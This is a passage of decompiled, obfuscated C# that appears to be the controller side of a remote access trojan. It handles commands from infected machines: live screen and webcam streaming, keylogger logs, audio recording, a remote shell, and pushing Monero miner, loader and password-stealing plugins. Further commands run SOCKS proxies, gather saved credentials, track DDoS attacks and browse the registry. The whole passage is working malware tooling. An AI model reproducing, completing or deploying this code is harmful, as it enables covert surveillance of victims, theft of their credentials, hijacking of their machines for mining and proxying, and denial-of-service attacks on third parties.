									else if (Operators.CompareString(left2, "screenlive_secondary", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient34 = cclient7;
											bool flag = true;
											cclient34.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										if (num4 - 1L == unchecked((long)array[3].Length))
										{
											MemoryStream stream2 = new MemoryStream(class2.byte_0);
											cclient7.fDB.vmethod_248().Image = Image.FromStream(stream2);
										}
									}
									else if (Operators.CompareString(left2, "screenlive_stop", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient35 = cclient7;
											bool flag = true;
											cclient35.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										cclient7.fDB.method_6();
									}
									else if (Operators.CompareString(left2, "screen_preview_stop", true) != 0)
									{
										if (Operators.CompareString(left2, "monitors_refresh", true) == 0)
										{
											if (cclient7.fDB == null)
											{
												CClient cclient36 = cclient7;
												bool flag = true;
												cclient36.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											cclient7.fDB.method_7(ref class2.class152_0.string_0[0]);
										}
										else if (Operators.CompareString(left2, "webcamlive", true) == 0)
										{
											if (cclient7.fDB == null)
											{
												CClient cclient37 = cclient7;
												bool flag = true;
												cclient37.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											if (num4 - 1L == unchecked((long)array[3].Length))
											{
												MemoryStream stream3 = new MemoryStream(class2.byte_0);
												cclient7.fDB.vmethod_264().Image = Image.FromStream(stream3);
												CClient cclient38 = cclient7;
												double num21 = (double)(Strings.Len(array[0]) + Strings.Len(array[1]) + Strings.Len(array[2]) + Strings.Len(array[3]) + 4);
												cclient38.WEBCAM_FPS_UPDATE(ref num21);
											}
										}
										else if (Operators.CompareString(left2, "webcam_start", true) == 0)
										{
											bool flag;
											if (cclient7.fDB == null)
											{
												CClient cclient39 = cclient7;
												flag = true;
												cclient39.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											fDashboard fDB4 = cclient7.fDB;
											flag = true;
											fDB4.method_9(ref flag);
										}
										else if (Operators.CompareString(left2, "webcam_stop", true) == 0)
										{
											bool flag;
											if (cclient7.fDB == null)
											{
												CClient cclient40 = cclient7;
												flag = true;
												cclient40.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											fDashboard fDB5 = cclient7.fDB;
											flag = false;
											fDB5.method_9(ref flag);
										}
										else if (Operators.CompareString(left2, "webcam_devices", true) == 0)
										{
											if (cclient7.fDB == null)
											{
												CClient cclient41 = cclient7;
												bool flag = true;
												cclient41.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											cclient7.fDB.method_8(ref class2.class152_0.string_0[0]);
										}
										else if (Operators.CompareString(left2, "klgoff_list", true) == 0)
										{
											if (cclient7.fDB == null)
											{
												CClient cclient42 = cclient7;
												bool flag = true;
												cclient42.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											cclient7.fDB.method_87(ref class2.class152_0.string_0[0]);
										}
										else if (Operators.CompareString(left2, "klgoff_get", true) == 0)
										{
											if (cclient7.fDB == null)
											{
												CClient cclient43 = cclient7;
												bool flag = true;
												cclient43.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											cclient7.fDB.method_88(ref class2.class152_0.string_0[0]);
										}
										else if (Operators.CompareString(left2, "klgoff_del", true) == 0)
										{
											if (cclient7.fDB == null)
											{
												CClient cclient44 = cclient7;
												bool flag = true;
												cclient44.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											cclient7.fDB.method_95(ref class2.class152_0.string_0[0]);
										}
										else if (Operators.CompareString(left2, "klgonlinestart", true) == 0)
										{
											bool flag;
											if (cclient7.fDB == null)
											{
												CClient cclient45 = cclient7;
												flag = true;
												cclient45.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											fDashboard fDB6 = cclient7.fDB;
											flag = true;
											fDB6.method_101(ref flag);
										}
										else if (Operators.CompareString(left2, "klgonlinestop", true) == 0)
										{
											bool flag;
											if (cclient7.fDB == null)
											{
												CClient cclient46 = cclient7;
												flag = true;
												cclient46.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											fDashboard fDB7 = cclient7.fDB;
											flag = false;
											fDB7.method_101(ref flag);
										}
										else if (Operators.CompareString(left2, "klgonlinedata", true) == 0)
										{
											if (cclient7.fDB == null)
											{
												CClient cclient47 = cclient7;
												bool flag = true;
												cclient47.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											cclient7.fDB.method_100(ref class2.class152_0.string_0[0]);
										}
										else if (Operators.CompareString(left2, "aud_rec", true) == 0)
										{
											if (cclient7.fDB == null)
											{
												CClient cclient48 = cclient7;
												bool flag = true;
												cclient48.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											new Thread(new ThreadStart(class2._Lambda$__15)).Start();
										}
										else if (Operators.CompareString(left2, "aud_rec_list", true) == 0)
										{
											if (cclient7.fDB == null)
											{
												CClient cclient49 = cclient7;
												bool flag = true;
												cclient49.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											fDashboard fDB8 = cclient7.fDB;
											string text = Encoding.UTF8.GetString(Convert.FromBase64String(class2.class152_0.string_0[0]));
											fDB8.method_96(ref text);
										}
										else if (Operators.CompareString(left2, "shell_start", true) == 0)
										{
											bool flag;
											if (cclient7.fDB == null)
											{
												CClient cclient50 = cclient7;
												flag = true;
												cclient50.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											fDashboard fDB9 = cclient7.fDB;
											flag = true;
											fDB9.method_120(ref flag);
										}
										else if (Operators.CompareString(left2, "shell_stop", true) == 0)
										{
											bool flag;
											if (cclient7.fDB == null)
											{
												CClient cclient51 = cclient7;
												flag = true;
												cclient51.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											fDashboard fDB10 = cclient7.fDB;
											flag = false;
											fDB10.method_120(ref flag);
										}
										else if (Operators.CompareString(left2, "shell_exec", true) == 0)
										{
											if (cclient7.fDB == null)
											{
												CClient cclient52 = cclient7;
												bool flag = true;
												cclient52.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											cclient7.fDB.method_121(ref class2.class152_0.string_0[0]);
										}
										else if (Operators.CompareString(left2, "con_list", true) == 0)
										{
											if (cclient7.fDB == null)
											{
												CClient cclient53 = cclient7;
												bool flag = true;
												cclient53.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											new Thread(new ThreadStart(class2.class152_0._Lambda$__16)).Start();
										}
										else if (Operators.CompareString(left2, "xmr_mine_start", true) == 0)
										{
											Class130.fMinerXMR_0.method_0(cclient7.sKey, cclient7.sUser);
										}
										else if (Operators.CompareString(left2, "xmr_mine_stop", true) == 0)
										{
											Class130.fMinerXMR_0.method_2(cclient7.sKey);
										}
										else
										{
											if (Operators.CompareString(left2, "xmr_mine_req", true) == 0)
											{
												if (Operators.CompareString(class2.class152_0.string_0[0], "0", true) != 0)
												{
													goto IL_2352;
												}
												string sKey = cclient7.sKey;
												string str = "xmr_mine_data|";
												string text = Application.StartupPath + "\\data\\plugins\\xmr.plg";
												string str2 = Class136.smethod_29(ref text);
												string str3 = "|";
												text = Application.StartupPath + "\\data\\plugins\\xmr.plg";
												string string_17 = str + str2 + str3 + Class136.smethod_13(ref text);
												string string_18 = sKey;
												Class136.Class138 class4 = new Class136.Class138();
												class4.string_0 = string_18;
												class4.string_1 = string_17;
												class4.long_0 = 0L;
												try
												{
													if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
													{
														new Thread(new ThreadStart(class4._Lambda$__0)).Start();
													}
													goto IL_2352;
												}
												catch (Exception ex3)
												{
													goto IL_2352;
												}
											}
											if (Operators.CompareString(left2, "xmr_mine_ready", true) == 0)
											{
												string sKey2 = cclient7.sKey;
												string string_17 = "xmr_mine_start|" + cclient7.MINER_LAST_SETTINGS;
												string string_18 = sKey2;
												Class136.Class138 class4 = new Class136.Class138();
												class4.string_0 = string_18;
												class4.string_1 = string_17;
												class4.long_0 = 0L;
												try
												{
													if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
													{
														new Thread(new ThreadStart(class4._Lambda$__0)).Start();
													}
													goto IL_2352;
												}
												catch (Exception ex4)
												{
													goto IL_2352;
												}
											}
											if (Operators.CompareString(left2, "xmr64_mine_req", true) == 0)
											{
												if (Operators.CompareString(class2.class152_0.string_0[0], "0", true) != 0)
												{
													goto IL_2352;
												}
												string sKey3 = cclient7.sKey;
												string str4 = "xmr64_mine_data|";
												string text = Application.StartupPath + "\\data\\plugins\\xmr64.plg";
												string str5 = Class136.smethod_29(ref text);
												string str6 = "|";
												text = Application.StartupPath + "\\data\\plugins\\xmr64.plg";
												string string_17 = str4 + str5 + str6 + Class136.smethod_13(ref text);
												string string_18 = sKey3;
												Class136.Class138 class4 = new Class136.Class138();
												class4.string_0 = string_18;
												class4.string_1 = string_17;
												class4.long_0 = 0L;
												try
												{
													if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
													{
														new Thread(new ThreadStart(class4._Lambda$__0)).Start();
													}
													goto IL_2352;
												}
												catch (Exception ex5)
												{
													goto IL_2352;
												}
											}
											if (Operators.CompareString(left2, "xmr64_mine_ready", true) == 0)
											{
												string sKey4 = cclient7.sKey;
												string string_17 = "xmr64_mine_start|" + cclient7.MINER_LAST_SETTINGS;
												string string_18 = sKey4;
												Class136.Class138 class4 = new Class136.Class138();
												class4.string_0 = string_18;
												class4.string_1 = string_17;
												class4.long_0 = 0L;
												try
												{
													if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
													{
														new Thread(new ThreadStart(class4._Lambda$__0)).Start();
													}
													goto IL_2352;
												}
												catch (Exception ex6)
												{
													goto IL_2352;
												}
											}
											if (Operators.CompareString(left2, "xmr_mine_stats", true) == 0)
											{
												if (Class130.fMinerXMR_0.Visible)
												{
													Class130.fMinerXMR_0.method_1(cclient7.sKey, class2.class152_0.string_0);
												}
											}
											else if (Operators.CompareString(left2, "xmr_mine_log", true) == 0)
											{
												Class130.fMinerXMRLogManager_0.method_0(cclient7.sKey, cclient7.sIP + "^" + cclient7.sUser, class2.class152_0.string_0[0]);
											}
											else if (Operators.CompareString(left2, "socks4r_start", true) == 0)
											{
												Class130.fSocks4R_0.method_0(cclient7.sKey, cclient7.sUser, class2.class152_0.string_0[0], class2.class152_0.string_0[1]);
											}
											else if (Operators.CompareString(left2, "socks4r_stop", true) == 0)
											{
												Class130.fSocks4R_0.method_1(cclient7.sKey);
											}
											else if (Operators.CompareString(left2, "socks4r_stats", true) == 0)
											{
												Class130.fSocks4R_0.method_2(cclient7.sKey, class2.class152_0.string_0);
											}
											else if (Operators.CompareString(left2, "socks5_srv_start", true) == 0)
											{
												Class130.fSocks5_0.method_1(cclient7.sKey, cclient7.sUser, class2.class152_0.string_0[0], class2.class152_0.string_0[1]);
											}
											else if (Operators.CompareString(left2, "socks5_srv_stop", true) == 0)
											{
												Class130.fSocks5_0.method_2(cclient7.sKey);
											}
											else if (Operators.CompareString(left2, "socks5_srv_stats", true) == 0)
											{
												Class130.fSocks5_0.method_3(cclient7.sKey, class2.class152_0.string_0);
											}
											else
											{
												if (Operators.CompareString(left2, "plg_loader", true) == 0)
												{
													string sKey5 = cclient7.sKey;
													string[] array4 = new string[6];
													array4[0] = "plg_loader_data|";
													array4[1] = class2.class152_0.string_0[0];
													array4[2] = "|";
													int num22 = 3;
													string text = Application.StartupPath + "\\data\\plugins\\loader.plg";
													array4[num22] = Class136.smethod_29(ref text);
													array4[4] = "|";
													int num23 = 5;
													text = Application.StartupPath + "\\data\\plugins\\loader.plg";
													array4[num23] = Class136.smethod_13(ref text);
													string string_17 = string.Concat(array4);
													string string_18 = sKey5;
													Class136.Class138 class4 = new Class136.Class138();
													class4.string_0 = string_18;
													class4.string_1 = string_17;
													class4.long_0 = 0L;
													try
													{
														if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
														{
															new Thread(new ThreadStart(class4._Lambda$__0)).Start();
														}
														goto IL_2352;
													}
													catch (Exception ex7)
													{
														goto IL_2352;
													}
												}
												if (Operators.CompareString(left2, "crd_logins_req", true) == 0)
												{
													if (Operators.CompareString(class2.class152_0.string_0[0], "0", true) != 0)
													{
														goto IL_2352;
													}
													string sKey6 = cclient7.sKey;
													string str7 = "crd_logins_data|";
													string text = Application.StartupPath + "\\data\\plugins\\pws.plg";
													string str8 = Class136.smethod_29(ref text);
													string str9 = "|";
													text = Application.StartupPath + "\\data\\plugins\\pws.plg";
													string string_17 = str7 + str8 + str9 + Class136.smethod_13(ref text);
													string string_18 = sKey6;
													Class136.Class138 class4 = new Class136.Class138();
													class4.string_0 = string_18;
													class4.string_1 = string_17;
													class4.long_0 = 0L;
													try
													{
														if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
														{
															new Thread(new ThreadStart(class4._Lambda$__0)).Start();
														}
														goto IL_2352;
													}
													catch (Exception ex8)
													{
														goto IL_2352;
													}
												}
												if (Operators.CompareString(left2, "crd_logins", true) == 0)
												{
													if (cclient7.fDB == null)
													{
														CClient cclient54 = cclient7;
														bool flag = true;
														cclient54.SOCKET_DISCONNECT(ref flag);
														goto IL_23A3;
													}
													cclient7.fDB.method_2(ref class2.class152_0.string_0[0]);
												}
												else
												{
													if (Operators.CompareString(left2, "crd_logins_report_req", true) == 0)
													{
														if (Operators.CompareString(class2.class152_0.string_0[0], "0", true) != 0)
														{
															goto IL_2352;
														}
														string sKey7 = cclient7.sKey;
														string str10 = "crd_logins_report_data|";
														string text = Application.StartupPath + "\\data\\plugins\\pws.plg";
														string str11 = Class136.smethod_29(ref text);
														string str12 = "|";
														text = Application.StartupPath + "\\data\\plugins\\pws.plg";
														string string_17 = str10 + str11 + str12 + Class136.smethod_13(ref text);
														string string_18 = sKey7;
														Class136.Class138 class4 = new Class136.Class138();
														class4.string_0 = string_18;
														class4.string_1 = string_17;
														class4.long_0 = 0L;
														try
														{
															if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
															{
																new Thread(new ThreadStart(class4._Lambda$__0)).Start();
															}
															goto IL_2352;
														}
														catch (Exception ex9)
														{
															goto IL_2352;
														}
													}
													if (Operators.CompareString(left2, "crd_logins_report", true) == 0)
													{
														Class130.fCredentialsLogins_0.method_3(cclient7.sKey, cclient7.sIP + "^" + cclient7.sUser, class2.class152_0.string_0[0]);
													}
													else if (Operators.CompareString(left2, "remotebrowser_info", true) == 0)
													{
														if (cclient7.fDB == null)
														{
															CClient cclient55 = cclient7;
															bool flag = true;
															cclient55.SOCKET_DISCONNECT(ref flag);
															goto IL_23A3;
														}
														cclient7.fDB.method_98(ref class2.class152_0.string_0[0]);
													}
													else if (Operators.CompareString(left2, "remotebrowser_error", true) == 0)
													{
														if (cclient7.fDB == null)
														{
															CClient cclient56 = cclient7;
															bool flag = true;
															cclient56.SOCKET_DISCONNECT(ref flag);
															goto IL_23A3;
														}
														cclient7.fDB.method_99(ref class2.class152_0.string_0[0]);
													}
													else if (Operators.CompareString(left2, "remotebrowser_stop", true) == 0)
													{
														if (cclient7.fDB == null)
														{
															CClient cclient57 = cclient7;
															bool flag = true;
															cclient57.SOCKET_DISCONNECT(ref flag);
															goto IL_23A3;
														}
														cclient7.fDB.method_97();
													}
													else if (Operators.CompareString(left2, "speedtest", true) == 0)
													{
														cclient7.sBandwidthDL = class2.class152_0.string_0[0];
													}
													else if (Operators.CompareString(left2, "speedtest_started", true) == 0)
													{
														cclient7.BANDWIDTHDL = "...";
													}
													else if (Operators.CompareString(left2, "soft_list", true) == 0)
													{
														if (cclient7.fDB == null)
														{
															CClient cclient58 = cclient7;
															bool flag = true;
															cclient58.SOCKET_DISCONNECT(ref flag);
															goto IL_23A3;
														}
														new Thread(new ThreadStart(class2.class152_0._Lambda$__17)).Start();
													}
													else if (Operators.CompareString(left2, "thumb_data", true) == 0)
													{
														if (cclient7.fDB == null)
														{
															CClient cclient59 = cclient7;
															bool flag = true;
															cclient59.SOCKET_DISCONNECT(ref flag);
															goto IL_23A3;
														}
														cclient7.fDB.fThumb_0.method_2();
														MemoryStream stream4 = new MemoryStream(Convert.FromBase64String(class2.class152_0.string_0[0]));
														cclient7.fDB.fThumb_0.vmethod_0().Image = Image.FromStream(stream4);
													}
													else if (Operators.CompareString(left2, "ddos_stats", true) == 0)
													{
														if (Class130.fDDOS_0.Visible)
														{
															Class130.fDDOS_0.method_1(cclient7.sKey, class2.class152_0.string_0);
														}
													}
													else if (Operators.CompareString(left2, "ddos_stop", true) == 0)
													{
														Class130.fDDOS_0.method_2(cclient7.sKey);
													}
													else if (Operators.CompareString(left2, "reg_hkeys_get", true) == 0)
													{
														if (cclient7.fDB == null)
														{
															CClient cclient60 = cclient7;
															bool flag = true;
															cclient60.SOCKET_DISCONNECT(ref flag);
															goto IL_23A3;
														}
														new Thread(new ThreadStart(class2.class152_0._Lambda$__18)).Start();
													}
													else if (Operators.CompareString(left2, "reg_keys_get", true) == 0)
													{
														if (cclient7.fDB == null)
														{
															CClient cclient61 = cclient7;
															bool flag = true;
															cclient61.SOCKET_DISCONNECT(ref flag);
															goto IL_23A3;
														}
														new Thread(new ThreadStart(class2.class152_0._Lambda$__19)).Start();
													}
													else if (Operators.CompareString(left2, "scr_tb", true) == 0)
													{
														if (Class135.smethod_0().UIThumbnails)
														{
															MemoryStream stream5 = new MemoryStream(Convert.FromBase64String(class2.class152_0.string_0[0]));
															cclient7.ICO_STATUS = Image.FromStream(stream5);
															Class130.imageList_1.Images.Add(cclient7.sKey, cclient7.ICO_STATUS);
															Class130.fMain_0.method_5(true);
														}
													}
													else if (Operators.CompareString(left2, "dl_dir_obj_count", true) == 0)
													{
														Class130.concurrentDictionary_1.TryAdd(class2.class152_0.string_0[0], (int)Math.Round(Conversion.Val(class2.class152_0.string_0[1])));
													}
													else if (cclient7.fDB == null)
													{
														CClient cclient62 = cclient7;
														bool flag = true;
														cclient62.SOCKET_DISCONNECT(ref flag);
														goto IL_23A3;
													}
												}
											}
										}
									}
								}
								IL_2352:
								fMain ff4 = cclient7.ff;
								CClient cclient63 = cclient7;
								ptr4 = ref cclient63.sKey;
								object value2 = cclient63.sKey;
								ff4.method_24(ref value2);
								ptr4 = Conversions.ToString(value2);
							}
							catch (Exception ex10)
							{
								Class130.concurrentDictionary_3[cclient7.sKey].sPacket.Clear();
							}
							IL_23A3:
							cclient2.sock_async.method_6(Encoding.UTF8.GetBytes("1"));
							ptr2 = ref Class130.struct20_0.double_3;
						}
						Class130.struct20_0.double_3 = ptr2 + 1.0;
						CClient cclient64 = Class130.concurrentDictionary_3[cclient2.SOCKET_COMMAND_USER_KEY];
						ptr2 = ref cclient64.stats_bytes_out;
						cclient64.stats_bytes_out = ptr2 + 1.0;
						CClient cclient65 = cclient2;
						bool flag3 = true;
						cclient65.SOCKET_DISCONNECT(ref flag3);
					}
					return;
				}
				if (cclient2.REMOTE_BROWSER_ACTIVE)
				{
					ref double ptr2 = ref Class130.struct20_0.double_2;
					Class130.struct20_0.double_2 = ptr2 + (double)num;
					ptr2 = ref Class130.struct20_0.double_4;
					Class130.struct20_0.double_4 = ptr2 + 1.0;
					CClient cclient66 = Class130.concurrentDictionary_3[cclient2.REMOTE_BROWSER_USER_KEY];
					ptr2 = ref cclient66.stats_bytes_in;
					cclient66.stats_bytes_in = ptr2 + (double)num;
					cclient2.mPacket.Write(ptr, 0, num);
					checked
					{
						if (ptr.Length > 2 && (ptr[ptr.Length - 1] == 124 & ptr[ptr.Length - 2] == 124 & ptr[ptr.Length - 3] == 124))
						{
							cclient2.mPacket.SetLength(cclient2.mPacket.Length - 3L);
							CClient cclient67 = cclient2;
							try
							{
								if (!cclient67.IS_SSL)
								{
									cclient67.sock_async.socket_0.Send(Encoding.UTF8.GetBytes("1"));
								}
								Class130.concurrentDictionary_3[cclient67.REMOTE_BROWSER_USER_KEY].fDB.vmethod_464().Image = Image.FromStream(new MemoryStream(cclient67.mPacket.ToArray()));
								Class130.concurrentDictionary_3[cclient67.REMOTE_BROWSER_USER_KEY].REMOTE_BROWSER_FPS_UPDATE((double)cclient67.mPacket.Length);
								cclient67.mPacket.SetLength(0L);
							}
							catch (Exception ex11)
							{
								cclient67.mPacket.SetLength(0L);
							}
						}
						return;
					}
				}
				if (cclient2.SCREEN_PREVIEW_ACTIVE)
				{
					ref double ptr2 = ref Class130.struct20_0.double_2;
					Class130.struct20_0.double_2 = ptr2 + (double)num;
					ptr2 = ref Class130.struct20_0.double_4;
					Class130.struct20_0.double_4 = ptr2 + 1.0;
					CClient cclient68 = Class130.concurrentDictionary_3[cclient2.SCREEN_PREVIEW_USER_KEY];
					ptr2 = ref cclient68.stats_bytes_in;
					cclient68.stats_bytes_in = ptr2 + (double)num;
					cclient2.mPacket.Write(ptr, 0, num);
					checked
					{
						if (ptr.Length > 2 && (ptr[ptr.Length - 1] == 124 & ptr[ptr.Length - 2] == 124 & ptr[ptr.Length - 3] == 124))
						{
							cclient2.mPacket.SetLength(cclient2.mPacket.Length - 3L);
							CClient cclient69 = cclient2;
							try
							{
								if (!cclient69.IS_SSL)
								{
									cclient69.sock_async.socket_0.Send(Encoding.UTF8.GetBytes("1"));
								}
								Class130.concurrentDictionary_3[cclient69.SCREEN_PREVIEW_USER_KEY].fPr.method_17();
								Class130.concurrentDictionary_3[cclient69.SCREEN_PREVIEW_USER_KEY].fPr.vmethod_0().Image = Image.FromStream(new MemoryStream(cclient69.mPacket.ToArray()));
								if (Class135.smethod_0().PreviewDisplayFrameData)
								{
									CClient cclient70 = cclient69;
									ref long ptr5 = ref cclient70.lPreviewScreenFPS;
									cclient70.lPreviewScreenFPS = ptr5 + 1L;
									CClient cclient71 = cclient69;
									ref double ptr6 = ref cclient71.dPreviewScreenFPSAvgSize;
									unchecked
									{
										cclient71.dPreviewScreenFPSAvgSize = ptr6 + (double)cclient69.mPacket.Length;
										Class136.Struct27 @struct = default(Class136.Struct27);
										@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
										bool flag4 = false;
										if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
										{
											flag4 = true;
										}
										long num24;
										if (flag4)
										{
											num24 = Class136.GetTickCount64();
										}
										else
										{
											num24 = (long)Class136.GetTickCount();
										}
										if (checked(num24 - cclient69.lLastPreviewScreenFrame) >= 1000L)
										{
											Class130.concurrentDictionary_3[cclient69.SCREEN_PREVIEW_USER_KEY].fPr.method_18(cclient69.lPreviewScreenFPS, (double)cclient69.mPacket.Length, cclient69.dPreviewScreenFPSAvgSize);
											cclient69.lPreviewScreenFPS = 0L;
											cclient69.dPreviewScreenFPSAvgSize = 0.0;
											CClient cclient72 = cclient69;
											@struct = default(Class136.Struct27);
											@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
											flag4 = false;
											if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
											{
												flag4 = true;
											}
											if (flag4)
											{
												num24 = Class136.GetTickCount64();
											}
											else
											{
												num24 = (long)Class136.GetTickCount();
											}
											long lLastPreviewScreenFrame = num24;
											cclient72.lLastPreviewScreenFrame = lLastPreviewScreenFrame;
										}
									}
								}
								else
								{
									Class130.concurrentDictionary_3[cclient69.SCREEN_PREVIEW_USER_KEY].fPr.method_21();
								}
								cclient69.mPacket.SetLength(0L);
							}
							catch (Exception ex12)
							{
								cclient69.mPacket.SetLength(0L);
							}
						}
						return;
					}
				}
				if (cclient2.WEBCAM_PREVIEW_ACTIVE)
				{
					ref double ptr2 = ref Class130.struct20_0.double_2;
					Class130.struct20_0.double_2 = ptr2 + (double)num;
					ptr2 = ref Class130.struct20_0.double_4;
					Class130.struct20_0.double_4 = ptr2 + 1.0;
					CClient cclient73 = Class130.concurrentDictionary_3[cclient2.WEBCAM_PREVIEW_USER_KEY];
					ptr2 = ref cclient73.stats_bytes_in;
					cclient73.stats_bytes_in = ptr2 + (double)num;
					cclient2.mPacket.Write(ptr, 0, num);
					checked
					{
						if (ptr.Length > 2 && (ptr[ptr.Length - 1] == 124 & ptr[ptr.Length - 2] == 124 & ptr[ptr.Length - 3] == 124))
						{
							cclient2.mPacket.SetLength(cclient2.mPacket.Length - 3L);
							CClient cclient74 = cclient2;
							try
							{
								if (!cclient74.IS_SSL)
								{
									cclient74.sock_async.socket_0.Send(Encoding.UTF8.GetBytes("1"));
								}
								Class130.concurrentDictionary_3[cclient74.WEBCAM_PREVIEW_USER_KEY].fPr.method_17();
								Class130.concurrentDictionary_3[cclient74.WEBCAM_PREVIEW_USER_KEY].fPr.vmethod_0().Image = Image.FromStream(new MemoryStream(cclient74.mPacket.ToArray()));
								if (Class135.smethod_0().PreviewDisplayFrameData)
								{
									CClient cclient75 = cclient74;
									ref long ptr7 = ref cclient75.lPreviewWebcamFPS;
									cclient75.lPreviewWebcamFPS = ptr7 + 1L;
									CClient cclient76 = cclient74;
									ref double ptr8 = ref cclient76.dPreviewWebcamFPSAvgSize;
									unchecked
									{
										cclient76.dPreviewWebcamFPSAvgSize = ptr8 + (double)cclient74.mPacket.Length;
										Class136.Struct27 @struct = default(Class136.Struct27);
										@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
										bool flag4 = false;
										if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
										{
											flag4 = true;
										}
										long num24;
										if (flag4)
										{
											num24 = Class136.GetTickCount64();
										}
										else
										{
											num24 = (long)Class136.GetTickCount();
										}
										if (checked(num24 - cclient74.lLastPreviewWebcamFrame) >= 1000L)
										{
											Class130.concurrentDictionary_3[cclient74.WEBCAM_PREVIEW_USER_KEY].fPr.method_18(cclient74.lPreviewWebcamFPS, (double)cclient74.mPacket.Length, cclient74.dPreviewWebcamFPSAvgSize);
											cclient74.lPreviewWebcamFPS = 0L;
											cclient74.dPreviewWebcamFPSAvgSize = 0.0;
											CClient cclient77 = cclient74;
											@struct = default(Class136.Struct27);
											@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
											flag4 = false;
											if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
											{
												flag4 = true;
											}
											if (flag4)
											{
												num24 = Class136.GetTickCount64();
											}
											else
											{
												num24 = (long)Class136.GetTickCount();
											}
											long lLastPreviewWebcamFrame = num24;
											cclient77.lLastPreviewWebcamFrame = lLastPreviewWebcamFrame;
										}
									}
								}
								else
								{
									Class130.concurrentDictionary_3[cclient74.WEBCAM_PREVIEW_USER_KEY].fPr.method_21();
								}
								cclient74.mPacket.SetLength(0L);
							}
							catch (Exception ex13)
							{
								cclient74.mPacket.SetLength(0L);
							}
						}
						return;
					}
				}
				if (cclient2.WEBCAMSTREAM_ACTIVE)
				{
					ref double ptr2 = ref Class130.struct20_0.double_2;
					Class130.struct20_0.double_2 = ptr2 + (double)num;
					ptr2 = ref Class130.struct20_0.double_4;
					Class130.struct20_0.double_4 = ptr2 + 1.0;
					CClient cclient78 = Class130.concurrentDictionary_3[cclient2.WEBCAMSTREAM_USER_KEY];
					ptr2 = ref cclient78.stats_bytes_in;
					cclient78.stats_bytes_in = ptr2 + (double)num;
					cclient2.mPacket.Write(ptr, 0, num);
					checked
					{
						if (ptr.Length > 2 && (ptr[ptr.Length - 1] == 124 & ptr[ptr.Length - 2] == 124 & ptr[ptr.Length - 3] == 124))
						{
							cclient2.mPacket.SetLength(cclient2.mPacket.Length - 3L);
							CClient cclient79 = cclient2;
							try
							{
								if (!cclient79.IS_SSL)
								{
									cclient79.sock_async.socket_0.Send(Encoding.UTF8.GetBytes("1"));
								}
								Class130.concurrentDictionary_3[cclient79.WEBCAMSTREAM_USER_KEY].fDB.vmethod_264().Image = Image.FromStream(new MemoryStream(cclient79.mPacket.ToArray()));
								CClient cclient80 = Class130.concurrentDictionary_3[cclient79.WEBCAMSTREAM_USER_KEY];
								double num25 = (double)cclient79.mPacket.Length;
								cclient80.WEBCAM_FPS_UPDATE(ref num25);
								cclient79.mPacket.SetLength(0L);
							}
							catch (Exception ex14)
							{
								cclient79.mPacket.SetLength(0L);
							}
						}
						return;
					}
				}
				if (cclient2.SCREENLIVE_SECONDARY_ACTIVE)
				{
					ref double ptr2 = ref Class130.struct20_0.double_2;
					Class130.struct20_0.double_2 = ptr2 + (double)num;
					ptr2 = ref Class130.struct20_0.double_4;
					Class130.struct20_0.double_4 = ptr2 + 1.0;
					CClient cclient81 = Class130.concurrentDictionary_3[cclient2.SCREENLIVE_SECONDARY_USER_KEY];
					ptr2 = ref cclient81.stats_bytes_in;
					cclient81.stats_bytes_in = ptr2 + (double)num;
					cclient2.mPacket.Write(ptr, 0, num);
					checked
					{
						if (ptr.Length > 2 && (ptr[ptr.Length - 1] == 124 & ptr[ptr.Length - 2] == 124 & ptr[ptr.Length - 3] == 124))
						{
							cclient2.mPacket.SetLength(cclient2.mPacket.Length - 3L);
							CClient cclient82 = cclient2;
							try
							{
								if (!cclient82.IS_SSL)
								{
									cclient82.sock_async.socket_0.Send(Encoding.UTF8.GetBytes("1"));
								}
								Class130.concurrentDictionary_3[cclient82.SCREENLIVE_SECONDARY_USER_KEY].fDB.vmethod_248().Image = Image.FromStream(new MemoryStream(cclient82.mPacket.ToArray()));
								cclient82.mPacket.SetLength(0L);
							}
							catch (Exception ex15)
							{
								cclient82.mPacket.SetLength(0L);
							}
						}
						return;
					}
				}
				if (cclient2.FILE_TRANSFER_ACTIVE)
				{
					ref double ptr2 = ref Class130.struct20_0.double_2;
					Class130.struct20_0.double_2 = ptr2 + (double)num;
					ptr2 = ref Class130.struct20_0.double_4;
					Class130.struct20_0.double_4 = ptr2 + 1.0;
					CClient cclient83 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
